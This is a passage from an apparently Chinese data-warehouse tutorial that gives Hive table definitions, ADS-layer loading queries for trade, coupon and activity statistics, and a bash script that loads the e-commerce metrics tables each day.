‘统计日期’,</p><p>`recent_days` BIGINT COMMENT ‘最近天数,1:最近1日,7:最近7天,30:最近30天’,</p><p>`order_total_amount` DECIMAL(16, 2) COMMENT ‘订单总额,GMV’,</p><p>`order_count` BIGINT COMMENT ‘订单数’,</p><p>`order_user_count` BIGINT COMMENT ‘下单人数’,</p><p>`order_refund_count` BIGINT COMMENT ‘退单数’,</p><p>`order_refund_user_count` BIGINT COMMENT ‘退单人数’</p><p>) COMMENT ‘交易统计’</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>LOCATION ‘/warehouse/gmall/ads/ads_trade_stats/‘;</p><p><strong>2）数据装载</strong></p><p>insert overwrite table ads_trade_stats</p><p>select * from ads_trade_stats</p><p>union</p><p>select</p><p>‘2020-06-14’,</p><p>odr.recent_days,</p><p>order_total_amount,</p><p>order_count,</p><p>order_user_count,</p><p>order_refund_count,</p><p>order_refund_user_count</p><p>from</p><p>(</p><p>select</p><p>1 recent_days,</p><p>sum(order_total_amount_1d) order_total_amount,</p><p>sum(order_count_1d) order_count,</p><p>count(*) order_user_count</p><p>from dws_trade_user_order_1d</p><p>where dt=’2020-06-14’</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(order_total_amount),</p><p>sum(order_count),</p><p>sum(if(order_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then order_total_amount_7d</p><p>when 30 then order_total_amount_30d</p><p>end order_total_amount,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from dws_trade_user_order_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=’2020-06-14’</p><p>)t1</p><p>group by recent_days</p><p>)odr</p><p>join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>sum(order_refund_count_1d) order_refund_count,</p><p>count(*) order_refund_user_count</p><p>from dws_trade_user_order_refund_1d</p><p>where dt=’2020-06-14’</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(order_refund_count),</p><p>sum(if(order_refund_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then order_refund_count_7d</p><p>when 30 then order_refund_count_30d</p><p>end order_refund_count</p><p>from dws_trade_user_order_refund_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=’2020-06-14’</p><p>)t1</p><p>group by recent_days</p><p>)refund</p><p>on odr.recent_days=refund.recent_days;</p><h4 id="各省份交易统计"><a href="#各省份交易统计" class="headerlink" title="各省份交易统计"></a>各省份交易统计</h4><p>需求说明如下</p><table><thead><tr><th>统计周期</th><th>统计粒度</th><th>指标</th><th>说明</th></tr></thead><tbody><tr><td>最近1、7、30日</td><td>省份</td><td>订单数</td><td>略</td></tr><tr><td>最近1、7、30日</td><td>省份</td><td>订单金额</td><td>略</td></tr></tbody></table><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS ads_order_by_province;</p><p>CREATE EXTERNAL TABLE ads_order_by_province</p><p>(</p><p>`dt` STRING COMMENT ‘统计日期’,</p><p>`recent_days` BIGINT COMMENT ‘最近天数,1:最近1天,7:最近7天,30:最近30天’,</p><p>`province_id` STRING COMMENT ‘省份ID’,</p><p>`province_name` STRING COMMENT ‘省份名称’,</p><p>`area_code` STRING COMMENT ‘地区编码’,</p><p>`iso_code` STRING COMMENT ‘国际标准地区编码’,</p><p>`iso_code_3166_2` STRING COMMENT ‘国际标准地区编码’,</p><p>`order_count` BIGINT COMMENT ‘订单数’,</p><p>`order_total_amount` DECIMAL(16, 2) COMMENT ‘订单金额’</p><p>) COMMENT ‘各地区订单统计’</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>LOCATION ‘/warehouse/gmall/ads/ads_order_by_province/‘;</p><p><strong>2）数据装载</strong></p><p>insert overwrite table ads_order_by_province</p><p>select * from ads_order_by_province</p><p>union</p><p>select</p><p>‘2020-06-14’ dt,</p><p>1 recent_days,</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>order_count_1d,</p><p>order_total_amount_1d</p><p>from dws_trade_province_order_1d</p><p>where dt=’2020-06-14’</p><p>union</p><p>select</p><p>‘2020-06-14’ dt,</p><p>recent_days,</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>sum(order_count),</p><p>sum(order_total_amount)</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count,</p><p>case recent_days</p><p>when 7 then order_total_amount_7d</p><p>when 30 then order_total_amount_30d</p><p>end order_total_amount</p><p>from dws_trade_province_order_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=’2020-06-14’</p><p>)t1</p><p>group by recent_days,province_id,province_name,area_code,iso_code,iso_3166_2;</p><h3 id="优惠券主题"><a href="#优惠券主题" class="headerlink" title="优惠券主题"></a>优惠券主题</h3><h4 id="最近30天发布的优惠券的补贴率"><a href="#最近30天发布的优惠券的补贴率" class="headerlink" title="最近30天发布的优惠券的补贴率"></a>最近30天发布的优惠券的补贴率</h4><p>需求说明如下</p><table><thead><tr><th>统计粒度</th><th>指标</th><th>说明</th></tr></thead><tbody><tr><td>优惠券</td><td>补贴率</td><td>用券的订单明细优惠券减免金额总和/原始金额总和</td></tr></tbody></table><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS ads_coupon_stats;</p><p>CREATE EXTERNAL TABLE ads_coupon_stats</p><p>(</p><p>`dt` STRING COMMENT ‘统计日期’,</p><p>`coupon_id` STRING COMMENT ‘优惠券ID’,</p><p>`coupon_name` STRING COMMENT ‘优惠券名称’,</p><p>`start_date` STRING COMMENT ‘发布日期’,</p><p>`rule_name` STRING COMMENT ‘优惠规则，例如满100元减10元’,</p><p>`reduce_rate` DECIMAL(16, 2) COMMENT ‘补贴率’</p><p>) COMMENT ‘优惠券统计’</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>LOCATION ‘/warehouse/gmall/ads/ads_coupon_stats/‘;</p><p><strong>2）数据装载</strong></p><p>insert overwrite table ads_coupon_stats</p><p>select * from ads_coupon_stats</p><p>union</p><p>select</p><p>‘2020-06-14’ dt,</p><p>coupon_id,</p><p>coupon_name,</p><p>start_date,</p><p>coupon_rule,</p><p>cast(coupon_reduce_amount_30d/original_amount_30d as decimal(16,2))</p><p>from dws_trade_coupon_order_nd</p><p>where dt=’2020-06-14’;</p><h3 id="活动主题"><a href="#活动主题" class="headerlink" title="活动主题"></a>活动主题</h3><h4 id="最近30天发布的活动的补贴率"><a href="#最近30天发布的活动的补贴率" class="headerlink" title="最近30天发布的活动的补贴率"></a>最近30天发布的活动的补贴率</h4><p>需求说明如下</p><table><thead><tr><th>统计粒度</th><th>指标</th><th>说明</th></tr></thead><tbody><tr><td>活动</td><td>补贴率</td><td>参与促销活动的订单明细活动减免金额总和/原始金额总和</td></tr></tbody></table><p><strong>1）建表语句</strong></p><p>DROP TABLE IF EXISTS ads_activity_stats;</p><p>CREATE EXTERNAL TABLE ads_activity_stats</p><p>(</p><p>`dt` STRING COMMENT ‘统计日期’,</p><p>`activity_id` STRING COMMENT ‘活动ID’,</p><p>`activity_name` STRING COMMENT ‘活动名称’,</p><p>`start_date` STRING COMMENT ‘活动开始日期’,</p><p>`reduce_rate` DECIMAL(16, 2) COMMENT ‘补贴率’</p><p>) COMMENT ‘活动统计’</p><p>ROW FORMAT DELIMITED FIELDS TERMINATED BY ‘\t’</p><p>LOCATION ‘/warehouse/gmall/ads/ads_activity_stats/‘;</p><p><strong>2）数据装载</strong></p><p>insert overwrite table ads_activity_stats</p><p>select * from ads_activity_stats</p><p>union</p><p>select</p><p>‘2020-06-14’ dt,</p><p>activity_id,</p><p>activity_name,</p><p>start_date,</p><p>cast(activity_reduce_amount_30d/original_amount_30d as decimal(16,2))</p><p>from dws_trade_activity_order_nd</p><p>where dt=’2020-06-14’;</p><h3 id="数据装载脚本-6"><a href="#数据装载脚本-6" class="headerlink" title="数据装载脚本"></a>数据装载脚本</h3><p><strong>1）每日数据装载脚本</strong></p><p>（1）在hadoop102的/home/atguigu/bin目录下创建dws_to_ads.sh</p><p>[atguigu@hadoop102 bin]$ vim dws_to_ads.sh</p><p>（2）编写如下内容</p><p>##!/bin/bash</p><p>APP=gmall</p><p>## 如果是输入的日期按照取输入日期；如果没输入日期取当前时间的前一天</p><p>if [ -n “$2” ] ;then</p><p>do_date=$2</p><p>else</p><p>do_date=`date -d “-1 day” +%F`</p><p>fi</p><p>ads_activity_stats=”</p><p>insert overwrite table ${APP}.ads_activity_stats</p><p>select * from ${APP}.ads_activity_stats</p><p>union</p><p>select</p><p>‘$do_date’ dt,</p><p>activity_id,</p><p>activity_name,</p><p>start_date,</p><p>cast(activity_reduce_amount_30d/original_amount_30d as decimal(16,2))</p><p>from ${APP}.dws_trade_activity_order_nd</p><p>where dt=’$do_date’;</p><p>“</p><p>ads_coupon_stats=”</p><p>insert overwrite table ${APP}.ads_coupon_stats</p><p>select * from ${APP}.ads_coupon_stats</p><p>union</p><p>select</p><p>‘$do_date’ dt,</p><p>coupon_id,</p><p>coupon_name,</p><p>start_date,</p><p>coupon_rule,</p><p>cast(coupon_reduce_amount_30d/original_amount_30d as decimal(16,2))</p><p>from ${APP}.dws_trade_coupon_order_nd</p><p>where dt=’$do_date’;</p><p>“</p><p>ads_new_buyer_stats=”</p><p>insert overwrite table ${APP}.ads_new_buyer_stats</p><p>select * from ${APP}.ads_new_buyer_stats</p><p>union</p><p>select</p><p>‘$do_date’,</p><p>odr.recent_days,</p><p>new_order_user_count,</p><p>new_payment_user_count</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>sum(if(order_date_first&gt;=date_add(‘$do_date’,-recent_days+1),1,0))<br>new_order_user_count</p><p>from ${APP}.dws_trade_user_order_td lateral view explode(array(1,7,30)) tmp as<br>recent_days</p><p>where dt=’$do_date’</p><p>group by recent_days</p><p>)odr</p><p>join</p><p>(</p><p>select</p><p>recent_days,</p><p>sum(if(payment_date_first&gt;=date_add(‘$do_date’,-recent_days+1),1,0))<br>new_payment_user_count</p><p>from ${APP}.dws_trade_user_payment_td lateral view explode(array(1,7,30)) tmp<br>as recent_days</p><p>where dt=’$do_date’</p><p>group by recent_days</p><p>)pay</p><p>on odr.recent_days=pay.recent_days;</p><p>“</p><p>ads_order_by_province=”</p><p>insert overwrite table ${APP}.ads_order_by_province</p><p>select * from ${APP}.ads_order_by_province</p><p>union</p><p>select</p><p>‘$do_date’ dt,</p><p>1 recent_days,</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>order_count_1d,</p><p>order_total_amount_1d</p><p>from ${APP}.dws_trade_province_order_1d</p><p>where dt=’$do_date’</p><p>union</p><p>select</p><p>‘$do_date’ dt,</p><p>recent_days,</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>sum(order_count),</p><p>sum(order_total_amount)</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>province_id,</p><p>province_name,</p><p>area_code,</p><p>iso_code,</p><p>iso_3166_2,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count,</p><p>case recent_days</p><p>when 7 then order_total_amount_7d</p><p>when 30 then order_total_amount_30d</p><p>end order_total_amount</p><p>from ${APP}.dws_trade_province_order_nd lateral view explode(array(7,30)) tmp<br>as recent_days</p><p>where dt=’$do_date’</p><p>)t1</p><p>group by recent_days,province_id,province_name,area_code,iso_code,iso_3166_2;</p><p>“</p><p>ads_page_path=”</p><p>insert overwrite table ${APP}.ads_page_path</p><p>select * from ${APP}.ads_page_path</p><p>union</p><p>select</p><p>‘$do_date’ dt,</p><p>recent_days,</p><p>source,</p><p>nvl(target,’null’),</p><p>count(*) path_count</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>concat(‘step-‘,rn,’:’,page_id) source,</p><p>concat(‘step-‘,rn+1,’:’,next_page_id) target</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>page_id,</p><p>lead(page_id,1,null) over(partition by session_id,recent_days) next_page_id,</p><p>row_number() over (partition by session_id,recent_days order by view_time) rn</p><p>from ${APP}.dwd_traffic_page_view_inc lateral view explode(array(1,7,30)) tmp<br>as recent_days</p><p>where dt&gt;=date_add(‘$do_date’,-recent_days+1)</p><p>)t1</p><p>)t2</p><p>group by recent_days,source,target;</p><p>“</p><p>ads_repeat_purchase_by_tm=”</p><p>insert overwrite table ${APP}.ads_repeat_purchase_by_tm</p><p>select * from ${APP}.ads_repeat_purchase_by_tm</p><p>union</p><p>select</p><p>‘$do_date’ dt,</p><p>recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>cast(sum(if(order_count&gt;=2,1,0))/sum(if(order_count&gt;=1,1,0)) as decimal(16,2))</p><p>from</p><p>(</p><p>select</p><p>‘$do_date’ dt,</p><p>recent_days,</p><p>user_id,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_count) order_count</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>tm_id,</p><p>tm_name,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from ${APP}.dws_trade_user_sku_order_nd lateral view explode(array(7,30)) tmp<br>as recent_days</p><p>where dt=’$do_date’</p><p>)t1</p><p>group by recent_days,user_id,tm_id,tm_name</p><p>)t2</p><p>group by recent_days,tm_id,tm_name;</p><p>“</p><p>ads_sku_cart_num_top3_by_cate=”</p><p>insert overwrite table ${APP}.ads_sku_cart_num_top3_by_cate</p><p>select * from ${APP}.ads_sku_cart_num_top3_by_cate</p><p>union</p><p>select</p><p>‘$do_date’ dt,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sku_id,</p><p>sku_name,</p><p>cart_num,</p><p>rk</p><p>from</p><p>(</p><p>select</p><p>sku_id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>cart_num,</p><p>rank() over (partition by category1_id,category2_id,category3_id order by<br>cart_num desc) rk</p><p>from</p><p>(</p><p>select</p><p>sku_id,</p><p>sum(sku_num) cart_num</p><p>from ${APP}.dwd_trade_cart_full</p><p>where dt=’$do_date’</p><p>group by sku_id</p><p>)cart</p><p>left join</p><p>(</p><p>select</p><p>id,</p><p>sku_name,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name</p><p>from ${APP}.dim_sku_full</p><p>where dt=’$do_date’</p><p>)sku</p><p>on cart.sku_id=sku.id</p><p>)t1</p><p>where rk&lt;=3;</p><p>“</p><p>ads_trade_stats=”</p><p>insert overwrite table ${APP}.ads_trade_stats</p><p>select * from ${APP}.ads_trade_stats</p><p>union</p><p>select</p><p>‘$do_date’,</p><p>odr.recent_days,</p><p>order_total_amount,</p><p>order_count,</p><p>order_user_count,</p><p>order_refund_count,</p><p>order_refund_user_count</p><p>from</p><p>(</p><p>select</p><p>1 recent_days,</p><p>sum(order_total_amount_1d) order_total_amount,</p><p>sum(order_count_1d) order_count,</p><p>count(*) order_user_count</p><p>from ${APP}.dws_trade_user_order_1d</p><p>where dt=’$do_date’</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(order_total_amount),</p><p>sum(order_count),</p><p>sum(if(order_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then order_total_amount_7d</p><p>when 30 then order_total_amount_30d</p><p>end order_total_amount,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from ${APP}.dws_trade_user_order_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=’$do_date’</p><p>)t1</p><p>group by recent_days</p><p>)odr</p><p>join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>sum(order_refund_count_1d) order_refund_count,</p><p>count(*) order_refund_user_count</p><p>from ${APP}.dws_trade_user_order_refund_1d</p><p>where dt=’$do_date’</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(order_refund_count),</p><p>sum(if(order_refund_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then order_refund_count_7d</p><p>when 30 then order_refund_count_30d</p><p>end order_refund_count</p><p>from ${APP}.dws_trade_user_order_refund_nd lateral view explode(array(7,30))<br>tmp as recent_days</p><p>where dt=’$do_date’</p><p>)t1</p><p>group by recent_days</p><p>)refund</p><p>on odr.recent_days=refund.recent_days;</p><p>“</p><p>ads_trade_stats_by_cate=”</p><p>insert overwrite table ${APP}.ads_trade_stats_by_cate</p><p>select * from ${APP}.ads_trade_stats_by_cate</p><p>union</p><p>select</p><p>‘$do_date’ dt,</p><p>nvl(odr.recent_days,refund.recent_days),</p><p>nvl(odr.category1_id,refund.category1_id),</p><p>nvl(odr.category1_name,refund.category1_name),</p><p>nvl(odr.category2_id,refund.category2_id),</p><p>nvl(odr.category2_name,refund.category2_name),</p><p>nvl(odr.category3_id,refund.category3_id),</p><p>nvl(odr.category3_name,refund.category3_name),</p><p>nvl(order_count,0),</p><p>nvl(order_user_count,0),</p><p>nvl(order_refund_count,0),</p><p>nvl(order_refund_user_count,0)</p><p>from</p><p>(</p><p>select</p><p>1 recent_days,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sum(order_count_1d) order_count,</p><p>count(distinct(user_id)) order_user_count</p><p>from ${APP}.dws_trade_user_sku_order_1d</p><p>where dt=’$do_date’</p><p>group by<br>category1_id,category1_name,category2_id,category2_name,category3_id,category3_name</p><p>union all</p><p>select</p><p>recent_days,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sum(order_count),</p><p>count(distinct(if(order_count&gt;0,user_id,null)))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from ${APP}.dws_trade_user_sku_order_nd lateral view explode(array(7,30)) tmp<br>as recent_days</p><p>where dt=’$do_date’</p><p>)t1</p><p>group by<br>recent_days,category1_id,category1_name,category2_id,category2_name,category3_id,category3_name</p><p>)odr</p><p>full outer join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sum(order_refund_count_1d) order_refund_count,</p><p>count(distinct(user_id)) order_refund_user_count</p><p>from ${APP}.dws_trade_user_sku_order_refund_1d</p><p>where dt=’$do_date’</p><p>group by<br>category1_id,category1_name,category2_id,category2_name,category3_id,category3_name</p><p>union all</p><p>select</p><p>recent_days,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>sum(order_refund_count),</p><p>count(distinct(if(order_refund_count&gt;0,user_id,null)))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>category1_id,</p><p>category1_name,</p><p>category2_id,</p><p>category2_name,</p><p>category3_id,</p><p>category3_name,</p><p>case recent_days</p><p>when 7 then order_refund_count_7d</p><p>when 30 then order_refund_count_30d</p><p>end order_refund_count</p><p>from ${APP}.dws_trade_user_sku_order_refund_nd lateral view<br>explode(array(7,30)) tmp as recent_days</p><p>where dt=’$do_date’</p><p>)t1</p><p>group by<br>recent_days,category1_id,category1_name,category2_id,category2_name,category3_id,category3_name</p><p>)refund</p><p>on odr.recent_days=refund.recent_days</p><p>and odr.category1_id=refund.category1_id</p><p>and odr.category1_name=refund.category1_name</p><p>and odr.category2_id=refund.category2_id</p><p>and odr.category2_name=refund.category2_name</p><p>and odr.category3_id=refund.category3_id</p><p>and odr.category3_name=refund.category3_name;</p><p>“</p><p>ads_trade_stats_by_tm=”</p><p>insert overwrite table ${APP}.ads_trade_stats_by_tm</p><p>select * from ${APP}.ads_trade_stats_by_tm</p><p>union</p><p>select</p><p>‘$do_date’ dt,</p><p>nvl(odr.recent_days,refund.recent_days),</p><p>nvl(odr.tm_id,refund.tm_id),</p><p>nvl(odr.tm_name,refund.tm_name),</p><p>nvl(order_count,0),</p><p>nvl(order_user_count,0),</p><p>nvl(order_refund_count,0),</p><p>nvl(order_refund_user_count,0)</p><p>from</p><p>(</p><p>select</p><p>1 recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_count_1d) order_count,</p><p>count(distinct(user_id)) order_user_count</p><p>from ${APP}.dws_trade_user_sku_order_1d</p><p>where dt=’$do_date’</p><p>group by tm_id,tm_name</p><p>union all</p><p>select</p><p>recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_count),</p><p>count(distinct(if(order_count&gt;0,user_id,null)))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>tm_id,</p><p>tm_name,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from ${APP}.dws_trade_user_sku_order_nd lateral view explode(array(7,30)) tmp<br>as recent_days</p><p>where dt=’$do_date’</p><p>)t1</p><p>group by recent_days,tm_id,tm_name</p><p>)odr</p><p>full outer join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_refund_count_1d) order_refund_count,</p><p>count(distinct(user_id)) order_refund_user_count</p><p>from ${APP}.dws_trade_user_sku_order_refund_1d</p><p>where dt=’$do_date’</p><p>group by tm_id,tm_name</p><p>union all</p><p>select</p><p>recent_days,</p><p>tm_id,</p><p>tm_name,</p><p>sum(order_refund_count),</p><p>count(if(order_refund_count&gt;0,user_id,null))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>user_id,</p><p>tm_id,</p><p>tm_name,</p><p>case recent_days</p><p>when 7 then order_refund_count_7d</p><p>when 30 then order_refund_count_30d</p><p>end order_refund_count</p><p>from ${APP}.dws_trade_user_sku_order_refund_nd lateral view<br>explode(array(7,30)) tmp as recent_days</p><p>where dt=’$do_date’</p><p>)t1</p><p>group by recent_days,tm_id,tm_name</p><p>)refund</p><p>on odr.recent_days=refund.recent_days</p><p>and odr.tm_id=refund.tm_id</p><p>and odr.tm_name=refund.tm_name;</p><p>“</p><p>ads_traffic_stats_by_channel=”</p><p>insert overwrite table ${APP}.ads_traffic_stats_by_channel</p><p>select * from ${APP}.ads_traffic_stats_by_channel</p><p>union</p><p>select</p><p>‘$do_date’ dt,</p><p>recent_days,</p><p>channel,</p><p>cast(count(distinct(mid_id)) as bigint) uv_count,</p><p>cast(avg(during_time_1d)/1000 as bigint) avg_duration_sec,</p><p>cast(avg(page_count_1d) as bigint) avg_page_count,</p><p>cast(count(*) as bigint) sv_count,</p><p>cast(sum(if(page_count_1d=1,1,0))/count(*) as decimal(16,2)) bounce_rate</p><p>from ${APP}.dws_traffic_session_page_view_1d lateral view<br>explode(array(1,7,30)) tmp as recent_days</p><p>where dt&gt;=date_add(‘$do_date’,-recent_days+1)</p><p>group by recent_days,channel;</p><p>“</p><p>ads_user_action=”</p><p>insert overwrite table ${APP}.ads_user_action</p><p>select * from ${APP}.ads_user_action</p><p>union</p><p>select</p><p>‘$do_date’ dt,</p><p>page.recent_days,</p><p>home_count,</p><p>good_detail_count,</p><p>cart_count,</p><p>order_count,</p><p>payment_count</p><p>from</p><p>(</p><p>select</p><p>1 recent_days,</p><p>sum(if(page_id=’home’,1,0)) home_count,</p><p>sum(if(page_id=’good_detail’,1,0)) good_detail_count</p><p>from ${APP}.dws_traffic_page_visitor_page_view_1d</p><p>where dt=’$do_date’</p><p>and page_id in (‘home’,’good_detail’)</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(if(page_id=’home’ and view_count&gt;0,1,0)),</p><p>sum(if(page_id=’good_detail’ and view_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>page_id,</p><p>case recent_days</p><p>when 7 then view_count_7d</p><p>when 30 then view_count_30d</p><p>end view_count</p><p>from ${APP}.dws_traffic_page_visitor_page_view_nd lateral view<br>explode(array(7,30)) tmp as recent_days</p><p>where dt=’$do_date’</p><p>and page_id in (‘home’,’good_detail’)</p><p>)t1</p><p>group by recent_days</p><p>)page</p><p>join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>count(*) cart_count</p><p>from ${APP}.dws_trade_user_cart_add_1d</p><p>where dt=’$do_date’</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(if(cart_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then cart_add_count_7d</p><p>when 30 then cart_add_count_30d</p><p>end cart_count</p><p>from ${APP}.dws_trade_user_cart_add_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=’$do_date’</p><p>)t1</p><p>group by recent_days</p><p>)cart</p><p>on page.recent_days=cart.recent_days</p><p>join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>count(*) order_count</p><p>from ${APP}.dws_trade_user_order_1d</p><p>where dt=’$do_date’</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(if(order_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then order_count_7d</p><p>when 30 then order_count_30d</p><p>end order_count</p><p>from ${APP}.dws_trade_user_order_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=’$do_date’</p><p>)t1</p><p>group by recent_days</p><p>)ord</p><p>on page.recent_days=ord.recent_days</p><p>join</p><p>(</p><p>select</p><p>1 recent_days,</p><p>count(*) payment_count</p><p>from ${APP}.dws_trade_user_payment_1d</p><p>where dt=’$do_date’</p><p>union all</p><p>select</p><p>recent_days,</p><p>sum(if(order_count&gt;0,1,0))</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>case recent_days</p><p>when 7 then payment_count_7d</p><p>when 30 then payment_count_30d</p><p>end order_count</p><p>from ${APP}.dws_trade_user_payment_nd lateral view explode(array(7,30)) tmp as<br>recent_days</p><p>where dt=’$do_date’</p><p>)t1</p><p>group by recent_days</p><p>)pay</p><p>on page.recent_days=pay.recent_days;</p><p>“</p><p>ads_user_change=”</p><p>insert overwrite table ${APP}.ads_user_change</p><p>select * from ${APP}.ads_user_change</p><p>union</p><p>select</p><p>churn.dt,</p><p>user_churn_count,</p><p>user_back_count</p><p>from</p><p>(</p><p>select</p><p>‘$do_date’ dt,</p><p>count(*) user_churn_count</p><p>from ${APP}.dws_user_user_login_td</p><p>where dt=’$do_date’</p><p>and login_date_last=date_add(‘$do_date’,-7)</p><p>)churn</p><p>join</p><p>(</p><p>select</p><p>‘$do_date’ dt,</p><p>count(*) user_back_count</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>login_date_last</p><p>from ${APP}.dws_user_user_login_td</p><p>where dt=’$do_date’</p><p>)t1</p><p>join</p><p>(</p><p>select</p><p>user_id,</p><p>login_date_last login_date_previous</p><p>from ${APP}.dws_user_user_login_td</p><p>where dt=date_add(‘$do_date’,-1)</p><p>)t2</p><p>on t1.user_id=t2.user_id</p><p>where datediff(login_date_last,login_date_previous)&gt;=8</p><p>)back</p><p>on churn.dt=back.dt;</p><p>“</p><p>ads_user_retention=”</p><p>insert overwrite table ${APP}.ads_user_retention</p><p>select * from ${APP}.ads_user_retention</p><p>union</p><p>select</p><p>‘$do_date’ dt,</p><p>login_date_first create_date,</p><p>datediff(‘$do_date’,login_date_first) retention_day,</p><p>sum(if(login_date_last=’$do_date’,1,0)) retention_count,</p><p>count(*) new_user_count,</p><p>cast(sum(if(login_date_last=’$do_date’,1,0))/count(*)*100 as decimal(16,2))<br>retention_rate</p><p>from</p><p>(</p><p>select</p><p>user_id,</p><p>date_id login_date_first</p><p>from ${APP}.dwd_user_register_inc</p><p>where dt&gt;=date_add(‘$do_date’,-7)</p><p>and dt&lt;‘$do_date’</p><p>)t1</p><p>join</p><p>(</p><p>select</p><p>user_id,</p><p>login_date_last</p><p>from ${APP}.dws_user_user_login_td</p><p>where dt=’$do_date’</p><p>)t2</p><p>on t1.user_id=t2.user_id</p><p>group by login_date_first;</p><p>“</p><p>ads_user_stats=”</p><p>insert overwrite table ${APP}.ads_user_stats</p><p>select * from ${APP}.ads_user_stats</p><p>union</p><p>select</p><p>‘$do_date’ dt,</p><p>t1.recent_days,</p><p>new_user_count,</p><p>active_user_count</p><p>from</p><p>(</p><p>select</p><p>recent_days,</p><p>sum(if(login_date_last&gt;=date_add(‘$do_date’,-recent_days+1),1,0))<br>new_user_count</p><p>from ${APP}.dws_user_user_login_td lateral view explode(array(1,7,30)) tmp as<br>recent_days</p><p>where dt=’$do_date’</p><p>group by recent_days</p><p>)t1</p><p>join</p><p>(</p><p>select</p><p>recent_days,</p><p>sum(if(date_id&gt;=date_add(‘$do_date’,-recent_days+1),1,0)) active_user_count</p><p>from ${APP}.dwd_user_register_inc lateral view explode(array(1,7,30)) tmp 